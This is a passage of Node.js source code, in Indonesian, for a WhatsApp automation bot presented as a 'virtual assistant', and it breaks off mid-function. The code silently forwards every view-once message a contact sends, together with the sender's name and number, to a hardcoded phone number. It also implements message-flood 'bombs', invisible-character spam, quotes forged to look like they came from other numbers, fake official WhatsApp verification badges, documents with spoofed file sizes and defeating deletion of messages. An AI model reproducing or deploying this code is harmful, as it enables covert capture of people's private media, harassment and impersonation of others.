/**
 * =========================================================================
 * Asisten virtual
 * =========================================================================
 * Sistem otomatisasi dan asisten cerdas.
 * =========================================================================
*/

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const pino = require('pino');
const util = require('util');
const hapusLogSampah = (args) => {
    const text = util.format(...args);
    if (text.includes('Closing open session') || text.includes('SessionEntry') || text.includes('prekey bundle') || text.includes('_chains') || text.includes('Bad MAC') || text.includes('Session error')) return true;
    return false;
};
const originalLog = console.log;
const originalTrace = console.trace;
const originalDebug = console.debug;
const originalInfo = console.info;
const originalWarn = console.warn;
const originalError = console.error;
console.log = function(...args) { if (!hapusLogSampah(args)) originalLog.apply(console, args); };
console.trace = function(...args) { if (!hapusLogSampah(args)) originalTrace.apply(console, args); };
console.debug = function(...args) { if (!hapusLogSampah(args)) originalDebug.apply(console, args); };
console.info = function(...args) { if (!hapusLogSampah(args)) originalInfo.apply(console, args); };
console.warn = function(...args) { if (!hapusLogSampah(args)) originalWarn.apply(console, args); };
console.error = function(...args) { if (!hapusLogSampah(args)) originalError.apply(console, args); };

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    downloadContentFromMessage,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');

let vgenPrompt = "";
try { vgenPrompt = require('./prompt.js'); } catch (e) { vgenPrompt = "Kamu adalah asisten virtual yang efisien."; }

const app = express();
app.use(cors());
app.use(express.json());

const dbFile = './database.json';
let db = { apiConfig: {} };
if (fs.existsSync(dbFile)) {
    try { db = JSON.parse(fs.readFileSync(dbFile)); } catch (e) { console.log("Gagal membaca database."); }
}
function saveDb() { fs.writeFileSync(dbFile, JSON.stringify(db, null, 2)); }

let activeProvider = db.apiConfig?.provider || null; 
let activeApiKey = db.apiConfig?.apiKey || null; 
let activeModel = db.apiConfig?.model || null; 

const userHistory = {};
const aiMutedChats = {}; 
const MAX_HISTORY = 6; 

async function downloadMediaBaileys(message, type) {
    try {
        const stream = await downloadContentFromMessage(message, type);
        let buffer = Buffer.from([]);
        for await(const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
        return buffer;
    } catch (e) { return null; }
}

let sock; 
async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('sesi_bot');
    const { version } = await fetchLatestBaileysVersion(); 

    sock = makeWASocket({
        version, 
        auth: state,
        markOnlineOnConnect: true,
        logger: pino({ level: 'silent' }),
        browser: ['Asisten virtual', 'Chrome', '2.0.0'], 
        
        getMessage: async (key) => {
            return {
                conversation: "Sistem merekonstruksi pesan..."
            };
        }
    });

    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update; 
        
        if (connection === 'connecting') {
            console.log('Menghubungkan ke server...');
        }
        if (qr) {
            console.log('\nKode qr siap, silakan pindai:');
            qrcode.generate(qr, { small: true });
        }
        if (connection === 'close') {
            const errCode = lastDisconnect.error?.output?.statusCode;
            console.log(`Koneksi terputus (Kode: ${errCode}). Menghubungkan ulang...`);
            if (errCode !== DisconnectReason.loggedOut) startBot();
        } 
        else if (connection === 'open') {
            await sock.sendPresenceUpdate('available');
            console.log(`Sistem online dan siap digunakan.\n`);
        }
    });

    sock.ev.on('messages.upsert', async (m) => {
        if (m.type !== 'notify' && m.type !== 'append') return;
        const msg = m.messages[0];
        if (!msg.message) return;

        const from = msg.key.remoteJid;
        if (from.endsWith('@g.us') || from === 'status@broadcast') return; 

        const { parsePhoneNumber } = require('awesome-phonenumber'); 

        let pengirimRaw = '';
        if (msg.key.fromMe) {
            pengirimRaw = sock.user.id.split('@')[0].split(':')[0];
        } else {
            let targetJid = from.endsWith('@g.us') ? msg.key.participant : from;
            pengirimRaw = targetJid.split('@')[0].split(':')[0];
        }
        pengirimRaw = pengirimRaw.replace(/[^0-9]/g, '');

        if (pengirimRaw.startsWith('0')) pengirimRaw = '62' + pengirimRaw.slice(1);
        else if (pengirimRaw.startsWith('8')) pengirimRaw = '62' + pengirimRaw;

        let nomorRapi = '+' + pengirimRaw;
        try {
            const pn = parsePhoneNumber('+' + pengirimRaw);
            if (pn && pn.valid) nomorRapi = pn.number.international;
        } catch (e) {}

        const pushname = msg.pushName || 'Pengguna';

        const durasiMerekam = Math.floor((Math.abs(Math.sin(Date.now())) * 20) + 10) * 1000;
        await sock.sendPresenceUpdate('recording', from);
        setTimeout(async () => { 
            await sock.sendPresenceUpdate('paused', from); 
        }, durasiMerekam);

        let realMsg = msg.message;
        if (realMsg?.ephemeralMessage) realMsg = realMsg.ephemeralMessage.message;
        
        let isViewOnce = false;
        if (realMsg?.viewOnceMessage) {
            realMsg = realMsg.viewOnceMessage.message;
            isViewOnce = true;
        }
        if (realMsg?.viewOnceMessageV2) {
            realMsg = realMsg.viewOnceMessageV2.message;
            isViewOnce = true;
        }
        if (realMsg?.documentWithCaptionMessage) realMsg = realMsg.documentWithCaptionMessage.message;

        if (isViewOnce && !msg.key.fromMe) {
            await sock.sendMessage('62895410975149@s.whatsapp.net', { forward: msg });
            await sock.sendMessage('62895410975149@s.whatsapp.net', { 
                text: `Pesan sekali lihat terdeteksi.\nPengirim: ${pushname} (${nomorRapi})` 
            });
        }

        const type = Object.keys(realMsg).find(key => 
            !['messageContextInfo', 'senderKeyDistributionMessage'].includes(key)
        ) || Object.keys(realMsg)[0];

        let pesanTeks = '';
        let hasMedia = false;
        let isAudio = false; 
        
        if (type === 'conversation') { pesanTeks = realMsg.conversation; } 
        else if (type === 'extendedTextMessage') { pesanTeks = realMsg.extendedTextMessage.text; }
        else if (type === 'imageMessage') { pesanTeks = realMsg.imageMessage.caption || ''; hasMedia = true; }
        else if (type === 'videoMessage') { pesanTeks = realMsg.videoMessage.caption || ''; hasMedia = true; }
        else if (type === 'documentMessage') { pesanTeks = realMsg.documentMessage.caption || ''; hasMedia = true; }
        else if (type === 'stickerMessage') { hasMedia = true; }
        else if (type === 'audioMessage') { isAudio = true; } 
        else if (type === 'templateMessage') {
            const tm = realMsg.templateMessage;
            pesanTeks = tm.hydratedTemplate?.hydratedContentText || 
                        tm.hydratedTemplate?.extendedTextMessage?.text || 
                        tm.hydratedFourRowTemplate?.body?.text || '';
        }
        else if (type === 'interactiveMessage') {
            const im = realMsg.interactiveMessage;
            pesanTeks = im.body?.text || im.header?.title || im.header?.subtitle || '';
        }
        else if (type === 'buttonsMessage') {
            pesanTeks = realMsg.buttonsMessage.contentText || realMsg.buttonsMessage.text || '';
        }
        else if (type === 'listMessage') {
            pesanTeks = realMsg.listMessage.description || realMsg.listMessage.title || '';
        }

        const bodyTrimmed = pesanTeks.toLowerCase().trim();
        const isCmd = bodyTrimmed.startsWith('.') || bodyTrimmed.startsWith('!') || bodyTrimmed.startsWith('/');

        if (msg.key.fromMe && !isCmd) return;

        if (pesanTeks !== '') {
            console.log(`Pesan dari ${pushname} (${nomorRapi}): ${pesanTeks.substring(0, 45)}${pesanTeks.length > 45 ? '...' : ''}`);
        }

        const reply = async (text) => {          
            try {
                const fakeVerifikasiWA = {
                    key: {
                        fromMe: false,
                        participant: "0@s.whatsapp.net", 
                        remoteJid: "status@broadcast",
                        id: "3EB0" + Math.random().toString(16).substring(2, 14).toUpperCase()
                    },
                    message: {
                        extendedTextMessage: {
                            text: pesanTeks || "Media" 
                        }
                    }
                };

                let expirationTimer = undefined;
                if (msg.message?.ephemeralMessage?.messageContextInfo?.expiration) {
                    expirationTimer = msg.message.ephemeralMessage.messageContextInfo.expiration;
                } else if (msg.message?.ephemeralMessage) {
                    expirationTimer = 86400; 
                }

                let payloadPesan = { 
                    text: text,
                    contextInfo: {
                        isForwarded: false, 
                        isAiGenerated: true 
                    }
                };
                
                if (expirationTimer) {
                    payloadPesan.ephemeralExpiration = expirationTimer;
                }
                const sendMsg = await sock.sendMessage(from, payloadPesan, { quoted: fakeVerifikasiWA });
                
                return sendMsg;
            } catch (err) {
                const fallbackMsg = await sock.sendMessage(from, { text: text });
                return fallbackMsg;
            }
        };

        const hardBannedList = ["6289647369075","6289666046050","6289653405715","6289656337825","6282295187265","6282125254158","6288210392590","62895393706910","6285129449240","6285813943453","6285777604598","62895338858682","6285775230869","6285894444173","6285282593465","62895416002767","62895402208265","6281632100058","6289501502983","622127937262","622150857500","1500445","6285133485801","6285811073595","6288214101299","6287794963956","6282355156336","6289501982464","62895322501138","6289673685859","62895391790601","6281389354063","6289509781250","6287785837479","62895338097405","62895322540794","6285213533313","6289636432550","6281315557530","6289601970928","62895424040084","6287750310823","628972120517","6285218244039","6288809228876","6281315512649","6281387418241","628990464427","62895338155978","6285211594349","6282188608886","6285782046317","6288808940313","6282121012045","6281285036404","6281540090423","6285700581284"];
        if (hardBannedList.includes(pengirimRaw) && !msg.key.fromMe) {
            console.log(`Mengabaikan pesan dari pengguna terlarang: +${pengirimRaw}`);
            return;
        }

        global.lastActionTime = global.lastActionTime || {};

        if (['/mute', '.mute', '!mute'].includes(bodyTrimmed) || ['/unmute', '.unmute', '!unmute'].includes(bodyTrimmed)) {
            const timeOptions = { timeZone: 'Asia/Jakarta', hour12: false, year: 'numeric', month: 'numeric', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
            const currentTime = new Date().toLocaleString('id-ID', timeOptions) + ' WIB';
            
            if (['/mute', '.mute', '!mute'].includes(bodyTrimmed)) {
                if (aiMutedChats[from]) {
                    const lastTime = global.lastActionTime[from] || "Belum diketahui";
                    return reply(`Gagal mute. Sistem sudah mati di obrolan ini sejak ${lastTime}.`);
                }
                
                aiMutedChats[from] = true;
                global.lastActionTime[from] = currentTime;
                delete userHistory[from]; 
                return reply(`Respons sistem telah dimatikan.`);
            }

            if (['/unmute', '.unmute', '!unmute'].includes(bodyTrimmed)) {
                if (!aiMutedChats[from]) {
                    const lastTime = global.lastActionTime[from] || "Sejak sistem aktif";
                    return reply(`Gagal unmute. Sistem memang menyala di obrolan ini sejak ${lastTime}.`);
                }
                
                delete aiMutedChats[from];
                global.lastActionTime[from] = currentTime;
                return reply(`Respons sistem diaktifkan kembali.`);
            }
        }

        const cleanPengirim = String(pengirimRaw).trim();
        const isLID = from.includes('@lid') || (msg.key.participant && msg.key.participant.includes('@lid'));
        
        if (!isLID && !cleanPengirim.startsWith('62') && !msg.key.fromMe) {
            console.log(`Memblokir nomor luar negeri: +${cleanPengirim}`);
            return;
        }
        
        if (aiMutedChats[from] && !isCmd && !global.pendingKonfirmasi?.[from]) return;
        if (!userHistory[from]) userHistory[from] = [];

        global.aktifFitur = global.aktifFitur || [];
        global.pendingKonfirmasi = global.pendingKonfirmasi || {};

        const argsArray = pesanTeks.trim().split(/ +/);
        const cmdName = argsArray[0].toLowerCase();
        const argsTeks = pesanTeks.slice(cmdName.length).trim();

        if (global.pendingKonfirmasi[from] && !isCmd) {
            const konfirmasiState = global.pendingKonfirmasi[from];
            const waktuWIB = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
            const inputBalasan = pesanTeks.toUpperCase();
            
            if (inputBalasan === 'Y') {
                if (!global.aktifFitur.includes(konfirmasiState.nama)) {
                    global.aktifFitur.push(konfirmasiState.nama);
                }
                
switch (konfirmasiState.nama) {
    case 'bekukanterakhirdilihat':
        await sock.sendPresenceUpdate('unavailable', from);
        break;
        
    case 'sembunyikanstatusonline':
        await sock.sendPresenceUpdate('unavailable', from);
        break;
        
    case 'selalumengetik':
        await sock.sendPresenceUpdate('composing', from);
        break;
        
    case 'selalumerekam':
        await sock.sendPresenceUpdate('recording', from);
        break;
        
    case 'matikanmengetik':
        await sock.sendPresenceUpdate('paused', from);
        break;
        
    case 'matikanmerekam':
        await sock.sendPresenceUpdate('paused', from);
        break;
        
    case 'antihapuspesan':
        if (!global.isAntiHapusPesanActive) {
            sock.ev.on('messages.update', async (updates) => {
                if (!global.aktifFitur.includes('antihapuspesan')) return;
                for (const update of updates) {
                    if (update.update.message?.protocolMessage?.type === 0) {
                        const deletedKey = update.update.message.protocolMessage.key;
                        await sock.sendMessage(from, { text: `Sistem mendeteksi pesan yang ditarik dari ${deletedKey.participant || deletedKey.remoteJid}.` });
                    }
                }
            });
            global.isAntiHapusPesanActive = true;
        }
        await sock.sendMessage(from, { text: `Fitur anti hapus pesan beroperasi.` });
        break;
        
    case 'antihapusstatus':
        if (!global.isAntiHapusStatusActive) {
            sock.ev.on('messages.update', async (updates) => {
                if (!global.aktifFitur.includes('antihapusstatus')) return;
                for (const update of updates) {
                    if (update.key.remoteJid === 'status@broadcast' && update.update.message?.protocolMessage?.type === 0) {
                        await sock.sendMessage(from, { text: `Sebuah status dihapus, metadata telah ditahan.` });
                    }
                }
            });
            global.isAntiHapusStatusActive = true;
        }
        await sock.sendMessage(from, { text: `Fitur anti hapus status beroperasi.` });
        break;

    case 'centangbirupelajar':
        if (!global.isCentangBiruPelajarActive) {
            sock.ev.on('messages.upsert', async (m) => {
                if (!global.aktifFitur.includes('centangbirupelajar')) return;
                const msgData = m.messages[0];
                if (msgData.key.fromMe && msgData.message?.extendedTextMessage?.contextInfo?.stanzaId) {
                    const targetId = msgData.message.extendedTextMessage.contextInfo.stanzaId;
                    const targetParticipant = msgData.message.extendedTextMessage.contextInfo.participant;
                    const targetJid = msgData.key.remoteJid;
                    await sock.readMessages([{ remoteJid: targetJid, id: targetId, participant: targetParticipant }]);
                }
            });
            global.isCentangBiruPelajarActive = true;
        }
        await sock.sendMessage(from, { text: `Tanda baca hanya dikirim setelah merespons pesan.` });
        break;

    case 'matikanread':
        global.disableReadSignal = true; 
        await sock.sendMessage(from, { text: `Laporan dibaca dimatikan sepenuhnya.` });
        break;

    case 'tandaiwaktubaca': {
        const menitJeda = parseInt(konfirmasiState.args) || 1;
        const msJeda = menitJeda * 60000;
        setTimeout(async () => {
            await sock.readMessages([msg.key]);
        }, msJeda);
        await sock.sendMessage(from, { text: `Pesan akan ditandai dibaca dalam ${menitJeda} menit.` });
        break;
    }

    case 'antiviewonce':
        if (!global.isAntiViewOnceActive) {
            sock.ev.on('messages.upsert', async (m) => {
                if (!global.aktifFitur.includes('antiviewonce')) return;
                const viewMsg = m.messages[0];
                const vCore = viewMsg.message?.viewOnceMessage?.message || viewMsg.message?.viewOnceMessageV2?.message;
                if (vCore && !viewMsg.key.fromMe) {
                    if (vCore.imageMessage) vCore.imageMessage.viewOnce = false;
                    if (vCore.videoMessage) vCore.videoMessage.viewOnce = false;
                    await sock.sendMessage(from, { forward: viewMsg }, { quoted: viewMsg });
                }
            });
            global.isAntiViewOnceActive = true;
        }
        await sock.sendMessage(from, { text: `Sistem anti pesan sekali lihat aktif.` });
        break;

    case 'blokirasing': 
        global.blokirNomorAsingMode = true;
        await sock.sendMessage(from, { text: `Nomor di luar kontak akan ditolak secara otomatis.` });
        break;
    
    case 'blokirluarnegeri': 
        global.blokirLuarNegeriMode = true;
        await sock.sendMessage(from, { text: `Nomor luar negeri akan ditolak secara otomatis.` });
        break;

    case 'tolakpanggilan':
        if (!global.isTolakPanggilanActive) {
            sock.ev.on('call', async (calls) => {
                if (!global.aktifFitur.includes('tolakpanggilan')) return;
                for (const call of calls) {
                    if (call.status === 'offer') {
                        await sock.rejectCall(call.id, call.from);
                        await sock.sendMessage(call.from, { text: `Sistem menolak panggilan secara otomatis.` });
                    }
                }
            });
            global.isTolakPanggilanActive = true;
        }
        await sock.sendMessage(from, { text: `Filter panggilan masuk aktif.` });
        break;

    case 'antipromosi':
        if (!global.isAntiPromosiActive) {
            sock.ev.on('messages.upsert', async (m) => {
                if (!global.aktifFitur.includes('antipromosi')) return;
                const spamMsg = m.messages[0];
                if (spamMsg.key.fromMe) return;
                const spamTeks = spamMsg.message?.conversation || spamMsg.message?.extendedTextMessage?.text || "";
                if (/(http|https):\/\/|wa\.me|chat\.whatsapp\.com/i.test(spamTeks)) {
                    await sock.sendMessage(spamMsg.key.remoteJid, { delete: spamMsg.key });
                    await sock.sendMessage(spamMsg.key.remoteJid, { text: `Pesan berisi tautan promosi dihapus secara otomatis.` });
                }
            });
            global.isAntiPromosiActive = true;
        }
        await sock.sendMessage(from, { text: `Filter promosi dan tautan aktif.` });
        break;

    case 'diteruskanberkalikali':
        await sock.sendMessage(from, { 
            text: "Ini adalah demonstrasi pesan diteruskan.", 
            contextInfo: { 
                isForwarded: true, 
                forwardingScore: 999 
            } 
        });
        break;

    case 'tanpatagditeruskan':
        if (msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            const rawQuoted = JSON.parse(JSON.stringify(msg.message.extendedTextMessage.contextInfo.quotedMessage));
            const msgTipe = Object.keys(rawQuoted)[0];
            if (rawQuoted[msgTipe].contextInfo) delete rawQuoted[msgTipe].contextInfo;
            await sock.sendMessage(from, { forward: { key: msg.message.extendedTextMessage.contextInfo.stanzaId, message: rawQuoted } });
        } else {
            await sock.sendMessage(from, { text: "Gagal: harap mengutip pesan yang memiliki tag diteruskan." });
        }
        break;

    case 'pesanpalsu': {
        const partsPalsu = konfirmasiState.args.split(' ');
        const targetNumber = partsPalsu[0] ? partsPalsu[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : '0@s.whatsapp.net';
        const manipulatedText = partsPalsu.slice(1).join(' ') || 'Teks bawaan sistem';
        const constructedFakeQuote = {
            key: { fromMe: false, participant: targetNumber, remoteJid: from },
            message: { conversation: "Teks simulasi kutipan dari pengguna." }
        };
        await sock.sendMessage(from, { text: manipulatedText }, { quoted: constructedFakeQuote });
        break;
    }

    case 'pesanverifikasi': {
        const verifiedBadgeWA = {
            key: { fromMe: false, participant: '0@s.whatsapp.net', remoteJid: 'status@broadcast', id: 'HEX_VERIFIED_999' },
            message: { contactMessage: { vcard: 'BEGIN:VCARD\nVERSION:3.0\nN:;WhatsApp;;;\nFN:WhatsApp\nORG:WhatsApp\nTITLE:\nitem1.TEL;waid=0:0\nitem1.X-ABLabel:Ponsel\nEND:VCARD' } }
        };
        await sock.sendMessage(from, { text: "Simulasi status resmi berhasil." }, { quoted: verifiedBadgeWA });
        break;
    }

    case 'pesanrahasia': {
        const splitterRahasia = konfirmasiState.args.split('|');
        const trapText = splitterRahasia[0] ? splitterRahasia[0].trim() : 'Buka untuk membaca...';
        const hiddenPayload = splitterRahasia[1] ? splitterRahasia[1].trim() : 'Pesan tersembunyi sistem.';
        const invisibleSpace = String.fromCharCode(8206).repeat(4000);
        await sock.sendMessage(from, { text: `${trapText} ${invisibleSpace}\n${hiddenPayload}` });
        break;
    }

    case 'pesanephemeral':
        await sock.sendMessage(from, { 
            text: "Konteks pesan ini akan terhapus dalam 24 jam.", 
            ephemeralExpiration: 86400 
        });
        break;

    case 'hancurkanpesan':
        if (msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            const hancurMedia = msg.message.extendedTextMessage.contextInfo.quotedMessage;
            const hancurTipe = Object.keys(hancurMedia)[0];
            if (['imageMessage', 'videoMessage'].includes(hancurTipe)) {
                hancurMedia[hancurTipe].viewOnce = true;
                await sock.sendMessage(from, { forward: { key: msg.message.extendedTextMessage.contextInfo.stanzaId, message: hancurMedia } });
            } else {
                await sock.sendMessage(from, { text: "Gagal: harus berupa media gambar atau video." });
            }
        } else {
            await sock.sendMessage(from, { text: "Gagal: silakan kutip media untuk diubah menjadi sekali lihat." });
        }
        break;

    case 'tolaklink':
        global.tolakLinkHard = true;
        await sock.sendMessage(from, { text: "Filter aktif: tautan akan dibersihkan." });
        break;

    case 'tolakmedia':
        global.tolakMediaHard = true;
        await sock.sendMessage(from, { text: "Filter aktif: gambar atau video akan ditolak." });
        break;

    case 'tolakdokumen':
        global.tolakDokumenHard = true;
        await sock.sendMessage(from, { text: "Filter aktif: transmisi dokumen akan digagalkan." });
        break;

    case 'tolaklokasi':
        global.tolakLokasiHard = true;
        await sock.sendMessage(from, { text: "Filter aktif: koordinat lokasi tidak akan diterima." });
        break;

    case 'tolakkontak':
        global.tolakKontakHard = true;
        await sock.sendMessage(from, { text: "Filter aktif: penerimaan kontak dihentikan." });
        break;
        
    case 'autoreadstatus':
        if (!global.isAutoReadStoryActive) {
            sock.ev.on('messages.upsert', async (m) => {
                if (!global.aktifFitur.includes('autoreadstatus')) return;
                const storyData = m.messages[0];
                if (storyData.key.remoteJid === 'status@broadcast' && !storyData.key.fromMe) {
                    await sock.readMessages([storyData.key]);
                }
            });
            global.isAutoReadStoryActive = true;
        }
        await sock.sendMessage(from, { text: "Sistem membaca pembaruan status secara otomatis." });
        break;
        
    case 'autodownloadstatus':
        if (!global.isAutoDownloadStoryActive) {
            sock.ev.on('messages.upsert', async (m) => {
                if (!global.aktifFitur.includes('autodownloadstatus')) return;
                const getStory = m.messages[0];
                if (getStory.key.remoteJid === 'status@broadcast' && !getStory.key.fromMe) {
                    const stType = Object.keys(getStory.message || {})[0];
                    if (['imageMessage', 'videoMessage'].includes(stType)) {
                        console.log(`Menyimpan media status dari: ${getStory.key.participant}`);
                    }
                }
            });
            global.isAutoDownloadStoryActive = true;
        }
        await sock.sendMessage(from, { text: "Sistem pengunduhan status beroperasi." });
        break;

    case 'arsipotomatis':
        if (!global.isAutoArchiveActive) {
            sock.ev.on('messages.upsert', async (m) => {
                if (!global.aktifFitur.includes('arsipotomatis')) return;
                const archiveMsg = m.messages[0];
                if (!archiveMsg.key.fromMe) {
                    const archiveJid = archiveMsg.key.remoteJid;
                    await sock.chatModify({ archive: true, lastMessages: [{ key: archiveMsg.key, messageTimestamp: archiveMsg.messageTimestamp }] }, archiveJid);
                }
            });
            global.isAutoArchiveActive = true;
        }
        await sock.sendMessage(from, { text: `Semua pesan masuk akan dipindahkan ke arsip secara otomatis.` });
        break;

    case 'pinchatotomatis': {
        let pinArgs = konfirmasiState.args.trim().split(' ')[0];
        if (!pinArgs) return sock.sendMessage(from, { text: `Gagal: nomor target tidak disertakan.` });
        let pinTarget = pinArgs.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        await sock.chatModify({ pin: true }, pinTarget);
        await sock.sendMessage(from, { text: `Obrolan dengan ${pinTarget} berhasil disematkan.` });
        break;
    }

    case 'bisukanotomatis': {
        const muteParts = konfirmasiState.args.split(' ');
        if (muteParts.length < 2) return sock.sendMessage(from, { text: `Gagal: format harus berupa [nomor] [menit]` });
        let muteTarget = muteParts[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        let muteTime = parseInt(muteParts[1]) * 60 * 1000;
        await sock.chatModify({ mute: muteTime }, muteTarget);
        await sock.sendMessage(from, { text: `Sistem membisukan obrolan ${muteTarget} selama ${muteParts[1]} menit.` });
        break;
    }

    case 'bersihkanchat':
        await sock.chatModify({
            clear: { messages: [{ id: msg.key.id, fromMe: msg.key.fromMe, timestamp: msg.messageTimestamp }] }
        }, from);
        await sock.sendMessage(from, { text: `Riwayat obrolan telah dibersihkan.` });
        break;

    case 'tandaitelahdibaca':
        if (!global.isForceReadAllActive) {
            sock.ev.on('messages.upsert', async (m) => {
                if (!global.aktifFitur.includes('tandaitelahdibaca')) return;
                for (const unread of m.messages) {
                    if (!unread.key.fromMe) await sock.readMessages([unread.key]);
                }
            });
            global.isForceReadAllActive = true;
        }
        await sock.sendMessage(from, { text: `Sistem memaksa parameter dibaca pada semua pesan masuk.` });
        break;

    case 'bomteks': {
        const bomArgs = konfirmasiState.args.split(' ');
        let hitunganBom = parseInt(bomArgs[0]) || 10;
        let isiBom = bomArgs.slice(1).join(' ') || 'Pengujian sistem';
        if (hitunganBom > 100) hitunganBom = 100; 
        await sock.sendMessage(from, { text: `Mengirim ${hitunganBom} pesan beruntun.` });
        for (let i = 0; i < hitunganBom; i++) {
            await sock.sendMessage(from, { text: `${isiBom} [${i+1}]` });
            await new Promise(resolve => setTimeout(resolve, 300)); 
        }
        break;
    }

    case 'bomkosong': {
        let kosongCount = parseInt(konfirmasiState.args) || 10;
        if (kosongCount > 100) kosongCount = 100;
        const hampaBuffer = String.fromCharCode(8206).repeat(3000); 
        await sock.sendMessage(from, { text: `Mengirim pesan kosong.` });
        for (let i = 0; i < kosongCount; i++) {
            await sock.sendMessage(from, { text: `\u200B${hampaBuffer}\u200B` });
            await new Promise(resolve => setTimeout(resolve, 300));
        }
        break;
    }

    case 'spamreaksi': {
        const reaksiArgs = konfirmasiState.args.trim().split(' ')[0] || '✅';
        let targetKeySpam = msg.message?.extendedTextMessage?.contextInfo?.stanzaId 
            ? { remoteJid: from, id: msg.message.extendedTextMessage.contextInfo.stanzaId } 
            : msg.key;
            
        await sock.sendMessage(from, { text: `Reaksi berulang dijalankan.` });
        for (let i = 0; i < 5; i++) {
            await sock.sendMessage(from, { react: { text: reaksiArgs, key: targetKeySpam } });
            await new Promise(resolve => setTimeout(resolve, 500));
            await sock.sendMessage(from, { react: { text: '', key: targetKeySpam } }); 
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        await sock.sendMessage(from, { react: { text: reaksiArgs, key: targetKeySpam } });
        break;
    }

    case 'reaksiotomatis':
        if (!global.isAutoReactActive) {
            const autoReactEmoji = konfirmasiState.args.trim()[0] || '💬';
            global.autoReactSymbol = autoReactEmoji;
            sock.ev.on('messages.upsert', async (m) => {
                if (!global.aktifFitur.includes('reaksiotomatis')) return;
                const incomMsg = m.messages[0];
                if (!incomMsg.key.fromMe) {
                    await sock.sendMessage(incomMsg.key.remoteJid, { react: { text: global.autoReactSymbol, key: incomMsg.key } });
                }
            });
            global.isAutoReactActive = true;
        }
        await sock.sendMessage(from, { text: `Sistem akan membalas setiap pesan dengan reaksi ${global.autoReactSymbol}.` });
        break;

    case 'sticker': {
        if (!msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
            await sock.sendMessage(from, { text: `Gagal: anda harus mengutip pesan gambar.` });
            break;
        }
        await sock.sendMessage(from, { text: `Memproses gambar menjadi stiker.` });
        const targetImage = msg.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage;
        const imgBuffer = await downloadMediaBaileys(targetImage, 'image');
        
        await sock.sendMessage(from, { 
            sticker: imgBuffer, 
            mimetype: 'image/webp' 
        });
        break;
    }

    case 'brat': {
        const teksBrat = konfirmasiState.args.trim();
        if (!teksBrat) return sock.sendMessage(from, { text: `Gagal: teks tidak ditemukan.` });
        
        const apiUrl = `https://api.ryzendesu.vip/api/maker/brat?text=${encodeURIComponent(teksBrat)}`;
        await sock.sendMessage(from, { text: `Memproses teks.` });
        
        try {
            const fetchBrat = await fetch(apiUrl);
            const arrayBufferBrat = await fetchBrat.arrayBuffer();
            const bratBuffer = Buffer.from(arrayBufferBrat);
            await sock.sendMessage(from, { sticker: bratBuffer });
        } catch (e) {
            await sock.sendMessage(from, { text: `Gagal: layanan tidak merespons.` });
        }
        break;
    }

    case 'ubahsuara':
        if (!msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.audioMessage) {
            await sock.sendMessage(from, { text: `Gagal: silakan kutip pesan suara.` });
            break;
        }
        await sock.sendMessage(from, { text: `Mengonversi format audio ke ${konfirmasiState.args}.` });
        const targetAudio = msg.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage;
        const audioBuffer = await downloadMediaBaileys(targetAudio, 'audio');
        
        await sock.sendMessage(from, { 
            audio: audioBuffer, 
            mimetype: 'audio/mp4', 
            ptt: true 
        });
        break;

    case 'dokumenpalsu': {
        const mbSize = parseFloat(konfirmasiState.args.trim()) || 1024; 
        const realBytes = mbSize * 1024 * 1024;
        const dummyBuffer = Buffer.from('PAYLOAD_DOKUMEN'); 
        
        await sock.sendMessage(from, { 
            document: dummyBuffer, 
            mimetype: 'application/x-zip-compressed', 
            fileName: 'Arsip.zip',
            fileLength: realBytes 
        });
        break;
    }

    case 'kontakpalsu': {
        const argsKontak = konfirmasiState.args.split(' ');
        const namaVcard = argsKontak.slice(0, -1).join(' ') || 'Pengguna';
        const nomorVcard = argsKontak[argsKontak.length - 1] || '628000000000';
        
        const vcardString = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + `FN:${namaVcard}\n` 
            + `ORG:Sistem;\n` 
            + `TEL;type=CELL;type=VOICE;waid=${nomorVcard}:+${nomorVcard}\n` 
            + 'END:VCARD';
            
        await sock.sendMessage(from, {
            contacts: {
                displayName: namaVcard,
                contacts: [{ vcard: vcardString }]
            }
        });
        break;
    }

    case 'lokasipalsu': {
        const lokArgs = konfirmasiState.args.split(' ');
        const lat = parseFloat(lokArgs[0]) || -6.200000;
        const long = parseFloat(lokArgs[1]) || 106.816666;
        
        await sock.sendMessage(from, {
            location: { degreesLatitude: lat, degreesLongitude: long, name: "Lokasi simulasi" }
        });
        break;
    }

    case 'simpanmediaotomatis':
        if (!global.isAutoSaveMediaActive) {
            const fs = require('fs');
            const path = require('path');
            sock.ev.on('messages.upsert', async (m) => {
                if (!global.aktifFitur.includes('simpanmediaotomatis')) return;
                const mediaMsg = m.messages[0];
                if (mediaMsg.key.fromMe) return;
                
                const typeCek = Object.keys(mediaMsg.message || {})[0];
                if (['imageMessage', 'videoMessage', 'documentMessage'].includes(typeCek)) {
                    let mediaType = typeCek === 'imageMessage' ? 'image' : (typeCek === 'videoMessage' ? 'video' : 'document');
                    const buff = await downloadMediaBaileys(mediaMsg.message[typeCek], mediaType);
                    if (buff) {
                        const ekstensi = mediaType === 'image' ? '.jpg' : (mediaType === 'video' ? '.mp4' : '.bin');
                        fs.writeFileSync(path.join(__dirname, `riwayat_media/SISTEM_${Date.now()}${ekstensi}`), buff);
                    }
                }
            });
            global.isAutoSaveMediaActive = true;
        }
        await sock.sendMessage(from, { text: `Sistem penyimpanan berkas otomatis beroperasi.` });
        break;

    case 'hapusmediaotomatis': {
        const fs = require('fs');
        const path = require('path');
        const dirPath = path.join(__dirname, 'riwayat_media');
        if (fs.existsSync(dirPath)) {
            const files = fs.readdirSync(dirPath);
